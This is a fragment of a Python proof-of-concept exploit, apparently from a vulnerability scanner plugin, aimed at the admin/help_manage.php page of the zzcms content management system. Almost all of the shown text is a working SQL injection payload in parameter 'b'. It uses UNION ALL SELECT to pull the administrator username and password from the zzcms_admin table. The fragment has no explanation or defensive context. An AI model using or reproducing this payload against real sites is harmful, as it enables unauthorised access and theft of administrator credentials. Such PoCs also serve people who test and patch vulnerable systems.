...
def poc():
    try:
        if not target.url.endswith("admin/help_manage.php"):
            ...
            exit()
        payload = {
            "b": "-1 UNION ALL SELECT 7983,7983,7983,7983,7983,7983,(SELECT CONCAT(0x757365723a20,IFNULL(CAST(admin AS CHAR),0x20),0x20706173733a2020,IFNULL(CAST(pass AS CHAR),0x20)) FROM zzcms_admin LIMIT 0,1)-- "
        }
